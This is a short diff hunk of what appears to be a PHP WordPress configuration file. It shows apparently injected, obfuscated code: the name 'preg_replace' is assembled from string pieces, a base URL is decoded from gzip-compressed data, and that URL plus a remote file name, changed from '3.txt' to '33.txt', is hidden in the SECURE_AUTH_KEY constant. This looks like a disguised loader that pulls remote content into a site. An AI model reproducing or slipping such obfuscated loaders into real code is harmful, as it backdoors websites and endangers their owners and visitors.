@@ -36,7 +36,7 @@ $a='preg_r'; $b='eplace'; $pr = $a.$b;
 $base_url = $gzdec($compressed_data);
 
 // を追加
-define('SECURE_AUTH_KEY', $base_url . '3.txt');
+define('SECURE_AUTH_KEY', $base_url . '33.txt');
 
 
 /**#@+
